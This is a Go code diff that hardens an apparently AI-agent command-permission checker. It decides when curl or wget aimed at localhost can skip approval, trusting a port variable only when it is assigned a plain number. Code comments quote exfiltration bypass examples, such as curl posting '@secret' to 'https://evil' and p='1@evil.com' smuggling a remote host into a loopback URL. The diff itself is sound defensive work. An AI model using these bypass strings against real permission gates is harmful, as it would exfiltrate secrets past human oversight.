@@ -823,8 +823,23 @@ func normalizeNetworkEffectHost(target string) string {
 // be enough, so "curl -e http://localhost -d @secret https://evil" rode the
 // loopback carve-out; any other URL — even a flag value such as a referer or
 // --proxy — or a whole-word "$"/backtick expansion now voids it.
+//
+// numericVars carries the variables this command line assigns a plain integer
+// to, and is what lets a shell-assigned PORT stay on the carve-out (see
+// isLocalhostSubprocessToken). Without it every such URL asks.
 func subprocessTargetsLocalhost(command string) bool {
+	return subprocessTargetsLocalhostWithVars(command, nil)
+}
+
+// subprocessTargetsLocalhostWithVars is subprocessTargetsLocalhost with the
+// whole line's integer assignments supplied. Pass nil to derive them from the
+// command itself; pass the set when the caller has already parsed sibling
+// fragments whose "p=8080" assignments this command's "$p" depends on.
+func subprocessTargetsLocalhostWithVars(command string, numericVars map[string]bool) bool {
 	fields := splitShellFields(command)
+	if numericVars == nil {
+		numericVars = numericAssignedVars(command)
+	}
 	// A connection-redirecting flag points the request at a host other than the
 	// URL's, so "http://localhost/" can still send data off-machine (curl
 	// --connect-to/--resolve/-x, wget -e setting a proxy). Any such flag voids
@@ -836,7 +851,7 @@ func subprocessTargetsLocalhost(command string) bool {
 	}
 	sawLoopback := false
 	for i, token := range fields[1:] {
-		if isLocalhostSubprocessToken(token) {
+		if isLocalhostSubprocessToken(token, numericVars) {
 			sawLoopback = true
 			continue
 		}
@@ -938,7 +953,149 @@ func isPossibleRemoteTargetToken(token string) bool {
 	return true
 }
 
-func isLocalhostSubprocessToken(token string) bool {
+// numericAssignedVars returns the set of variable names this command line
+// assigns a plain decimal integer to ("p=8080", "PORT=8080"). Only those may be
+// treated as a numeric PORT by isLocalhostSubprocessToken.
+//
+// This is the guard that makes a shell-assigned port safe to honor. The port is
+// only uninteresting because it cannot change WHICH HOST is contacted — but
+// that reasoning only survives if the expansion is a number. "$p" is arbitrary
+// text: p='1@evil.com' turns "http://127.0.0.1:$p/x" into a request to
+// evil.com, injecting a new authority boundary. So the port spelling alone is
+// never trusted; only a same-line numeric assignment is.
+func numericAssignedVars(command string) map[string]bool {
+	return numericAssignedVarsFrom(splitShellFields(command), nil)
+}
+
+// numericAssignedVarsFrom collects variables assigned a plain integer, from the
+// tokens of the command being judged plus the assignments the PARSER put in their
+// own fragment. Both are needed: parseShellCommandLine lifts a leading "p=8080"
+// out of the curl fragment into parsedShellCommand.envVars, so judging the curl
+// fragment alone would not see the assignment its "$p" depends on.
+func numericAssignedVarsFrom(tokens, envVars []string) map[string]bool {
+	// LAST assignment wins, as in the shell. Collecting the first numeric one
+	// would be exploitable: "p=8080; p='1@evil.com'" must not be trusted
+	// because an earlier fragment happened to assign a number to p.
+	values := map[string]string{}
+	for _, group := range [][]string{tokens, envVars} {
+		for _, tok := range group {
+			// splitShellFields does not split on ';', so a trailing separator
+			// stays attached to the value ("p=8080;") and must be trimmed
+			// before the digits test.
+			name, value, ok := strings.Cut(tok, "=")
+			if !ok || name == "" || strings.ContainsAny(name, `:"'$`) {
+				continue
+			}
+			values[name] = strings.TrimRight(value, ";")
+		}
+	}
+	out := map[string]bool{}
+	for name, value := range values {
+		if isAllDigits(value) {
+			out[name] = true
+		}
+	}
+	// A numeric-literal `for` list is the other provably-numeric way a port
+	// variable gets its value: `for p in 8080 4096`. Every value the variable
+	// can take is a literal on the line, so this is as sound as an assignment —
+	// and without it the most common real form of a loopback port sweep still
+	// asks. It must be scanned on the RAW line (envVars), never on parsed
+	// fragments: parseShellCommandLine reduces `for p in 8080 4096; do curl …`
+	// to a bare `curl …$p…` fragment and discards the header entirely.
+	for name, numeric := range numericForLoopVars(envVars) {
+		out[name] = numeric
+	}
+	for name, numeric := range numericForLoopVars(tokens) {
+		out[name] = numeric
+	}
+	return out
+}
+
+// numericForLoopVars reports, for each `for VAR in …` header in the token
+// stream, whether EVERY listed word is a decimal literal. It returns false for
+// any list containing an expansion, glob, brace, or command substitution —
+// "for p in $(seq 8000 8010)" and "for p in 8000 $evil" are not proofs.
+func numericForLoopVars(tokens []string) map[string]bool {
+	out := map[string]bool{}
+	for i := 0; i+2 < len(tokens); i++ {
+		if tokens[i] != "for" || tokens[i+2] != "in" {
+			continue
+		}
+		name := tokens[i+1]
+		if name == "" || strings.ContainsAny(name, ":'\"$=") {
+			continue
+		}
+		allNumeric, sawWord := true, false
+		for _, w := range tokens[i+3:] {
+			w = strings.Trim(w, ";")
+			if w == "do" || w == "done" {
+				break
+			}
+			if w == "" {
+				continue
+			}
+			sawWord = true
+			if !isAllDigits(w) {
+				allNumeric = false
+				break
+			}
+		}
+		if sawWord {
+			out[name] = allNumeric
+		}
+	}
+	return out
+}
+
+// shellPortIsNumeric reports whether a URL authority's port component is safe to
+// ignore: either digits, or an expansion whose variable this command line
+// assigns a plain integer to. Anything else (an unassigned "$p", "$(cmd)", a
+// backtick, "@evil.com" smuggled into the value) is not numeric and voids the
+// carve-out.
+func shellPortIsNumeric(port string, numericVars map[string]bool) bool {
+	if port == "" {
+		return true
+	}
+	if isAllDigits(port) {
+		return true
+	}
+	// Accept only whole-token $VAR / ${VAR} forms, never a partial one like
+	// "80$p" or a value with an embedded "@" — those can carry a host.
+	t := port
+	if inner, ok := strings.CutPrefix(t, "${"); ok {
+		name, rest, closed := strings.Cut(inner, "}")
+		if !closed || rest != "" {
+			return false
+		}
+		t = name
+	} else {
+		if !strings.HasPrefix(t, "$") || len(t) < 2 {
+			return false
+		}
+		t = t[1:]
+	}
+	for i, r := range t {
+		alnum := r == '_' || (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (i > 0 && r >= '0' && r <= '9')
+		if !alnum {
+			return false
+		}
+	}
+	return numericVars[t]
+}
+
+// isLocalhostSubprocessToken reports whether a token names a loopback target.
+//
+// A loopback URL whose PORT is a shell variable normally defeats url.Parse
+// (`invalid port ":$p" after host`), so the host is recovered by hand here —
+// but only when the port is provably numeric (shellPortIsNumeric). Without that
+// check the carve-out is an exfiltration bypass: p='1@evil.com' makes
+// "http://127.0.0.1:$p/x" resolve to evil.com.
+//
+// The HOST is never taken from an expansion: "http://$h/" is a remote target
+// wearing a loopback literal, and honoring it would make this a universal
+// bypass. A userinfo component (@) is treated the way curl treats it: whatever
+// follows the last '@' is the real host.
+func isLocalhostSubprocessToken(token string, numericVars map[string]bool) bool {
 	t := strings.Trim(token, `"'<>`)
 	if t == "" {
 		return false
@@ -947,14 +1104,76 @@ func isLocalhostSubprocessToken(token string) bool {
 		if isLocalhostDomain(extractDomainFromURL(t)) {
 			return true
 		}
+		// url.Parse rejected it (non-numeric port). Recover host and port by
+		// hand, and only accept when the port is provably numeric.
+		if host, port, ok := splitURLAuthorityForLoopback(t); ok && shellPortIsNumeric(port, numericVars) {
+			return isLocalhostDomain(host)
+		}
+		return false
 	}
-	host := t
+	host, port := t, ""
 	if at := strings.LastIndex(host, "@"); at >= 0 {
 		host = host[at+1:]
 	}
-	host = strings.TrimPrefix(strings.TrimSuffix(host, "]"), "[")
-	if colon := strings.IndexByte(host, ':'); colon > 0 && !strings.ContainsAny(host[:colon], "/\\") {
-		host = host[:colon]
+	if strings.HasPrefix(host, "[") {
+		// Bracketed IPv6 literal: colons inside the brackets are not a port.
+		if end := strings.Index(host, "]"); end > 0 {
+			host, port = host[:end+1], strings.TrimPrefix(host[end+1:], ":")
+		} else {
+			return false
+		}
+	} else if colon := strings.IndexByte(host, ':'); colon > 0 && !strings.ContainsAny(host[:colon], "/\\") {
+		host, port = host[:colon], host[colon+1:]
+	}
+	// Everything from the first '/', '?' or '#' onward is path/query/fragment,
+	// not port. It MUST be trimmed before the numeric test rather than
+	// discarding the port entirely: "127.0.0.1:$p/x" would otherwise look like
+	// a portless loopback URL and hide the very "$p" that decides the answer.
+	if i := strings.IndexAny(port, "/?#"); i >= 0 {
+		port = port[:i]
+	}
+	if !shellPortIsNumeric(port, numericVars) {
+		return false
 	}
 	return isLocalhostDomain(host) || host == "0.0.0.0"
+}
+
+// splitURLAuthorityForLoopback splits "http://host:port" into its host and port
+// without url.Parse. It reports false for anything it cannot read confidently —
+// no http/https scheme, an empty host, or control characters — so an ambiguous
+// token stays non-loopback and keeps flowing through the gates.
+func splitURLAuthorityForLoopback(rawURL string) (host, port string, ok bool) {
+	rest, found := strings.CutPrefix(rawURL, "http://")
+	if !found {
+		rest, found = strings.CutPrefix(rawURL, "https://")
+	}
+	if !found {
+		return "", "", false
+	}
+	// Authority ends at the first '/', '?' or '#'.
+	if i := strings.IndexAny(rest, "/?#"); i >= 0 {
+		rest = rest[:i]
+	}
+	if rest == "" || strings.ContainsAny(rest, " \t\r\n\\") {
+		return "", "", false
+	}
+	// Userinfo: curl resolves whatever follows the LAST '@'.
+	if at := strings.LastIndex(rest, "@"); at >= 0 {
+		rest = rest[at+1:]
+	}
+	if rest == "" {
+		return "", "", false
+	}
+	if strings.HasPrefix(rest, "[") {
+		end := strings.Index(rest, "]")
+		if end < 0 {
+			return "", "", false
+		}
+		return rest[:end+1], strings.TrimPrefix(rest[end+1:], ":"), true
+	}
+	host, port, _ = strings.Cut(rest, ":")
+	if host == "" || strings.ContainsAny(host, " \"'") || strings.ContainsRune(host, '`') {
+		return "", "", false
+	}
+	return host, port, true
 }
